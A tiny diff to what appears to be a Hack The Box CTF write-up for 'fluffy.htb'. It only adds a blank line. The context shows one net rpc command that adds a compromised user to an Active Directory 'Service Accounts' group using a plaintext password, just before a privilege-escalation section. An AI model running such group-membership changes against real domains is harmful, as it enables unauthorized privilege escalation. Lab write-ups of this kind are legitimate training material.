@@ -450,6 +450,7 @@ bloodhound images
 ```
  net rpc group addmem "Service Accounts" "p.agila" -U "fluffy.htb"/"p.agila"%"prometheusx-303" -S 10.129.232.88
 ```
+
 ---
 ## Privilege Escalation
 
